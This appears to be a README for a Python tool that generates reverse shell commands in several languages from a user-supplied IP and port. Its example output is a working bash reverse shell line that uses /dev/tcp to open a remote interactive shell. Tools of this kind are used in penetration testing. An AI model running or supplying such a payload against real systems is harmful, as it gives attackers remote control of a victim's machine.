**Reverse Shell Script Generator**

This Python script generates reverse shell commands in various formats based on user input. The user specifies the desired type of reverse shell (e.g., bash, python, php, etc.), and the script generates the corresponding reverse shell command using the provided IP and port.

**Features:**

Supports multiple types of reverse shell commands: bash, socat, java, python, php, nc.exe, ruby, and perl.

Generates reverse shell commands with the correct format for each type.

Takes user input for the target IP address and port, and generates a custom reverse shell command.

**Requirements:**

Python 3.x

No external libraries are required.

**Usage:**

python script.py shell <host_ip> <host_port>

shell - Type of script you need

<host_ip> - your machine ip address

<host_port> - port to listen on

**Example:**

python script.py bash 192.168.1.100 4444

output:

/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

**Other shell types that can be generated include:**

socat

java

python

php

nc.exe

ruby

perl
